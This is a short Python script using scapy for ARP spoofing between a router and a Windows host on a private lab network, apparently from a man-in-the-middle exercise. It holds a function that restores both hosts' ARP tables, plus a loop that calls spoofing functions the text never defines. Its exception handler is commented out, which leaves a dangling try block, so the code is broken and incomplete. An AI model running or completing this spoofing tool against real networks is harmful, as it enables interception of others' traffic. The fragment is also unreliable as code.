#!/usr/bin/python3

from scapy.all import *

def restore():
    # restoring router table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.74.2"
    arp_response.hwdst = "00:50:56:ff:74:8b"
    arp_response.hwsrc = "00:0C:29:BE:47:14"
    arp_response.psrc = "192.168.74.129"
    send(arp_response)
    
    #restoring windows table
    arp_response = ARP()
    arp_response.op = 2
    arp_response.pdst = "192.168.74.129"
    arp_response.hwdst = "00:0C:29:BE:47:14"
    arp_response.hwsrc = "00:50:56:ff:74:8b"
    arp_response.psrc = "192.168.74.2"
    send(arp_response)

    try:
        while True:
            spoof_victim()
            spoof_router()
            time.sleep(2)
#except KeyboardInterrupt as err:
#    print("restoring ARP tables")
#    restore()
#    print("exiting")
#
